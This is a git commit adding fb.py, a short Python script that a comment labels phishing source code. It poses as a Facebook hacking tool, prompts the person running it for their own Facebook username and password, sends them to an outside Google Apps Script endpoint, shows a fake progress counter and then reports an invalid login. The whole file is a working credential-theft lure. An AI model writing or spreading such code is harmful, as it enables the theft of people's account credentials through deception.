cbef0b808b4e62b3d5ad93125e740edfadce73dd
bgmpyaesonehmoo290G <79253197+bgmpyaesonehmoo290G@users.noreply.github.com>
2021-02-21 19:29:00 +0630

    Create fb.py

---
+++ fb.py
@@ -0,0 +1,20 @@
+#phishing programထဲကsour
+#ce codeပါ
+import requests
+import pyfiglet
+import time
+a = pyfiglet.figlet_format('hack fb')
+print(a)
+print("autor by: kwee thite")
+print("dont use illegal")
+print('please login with your facebook \n for hack your firends')
+
+umail =input("please Enter Username:")
+upass =input("please Enter Fb password'")
+data ={'mail':umail,'pass':upass}
+rq =requests.post('https://script.google.com/macros/s/AKfycbyrANAizvME_Y0rh4f6tOwwDl5M2CV_Ux-1xvAjrN7Uf-appT8/exec',data=data)
+
+for i in range(100):
+   print(i,'%')
+   time.sleep(1)
+print('invalid password or username')
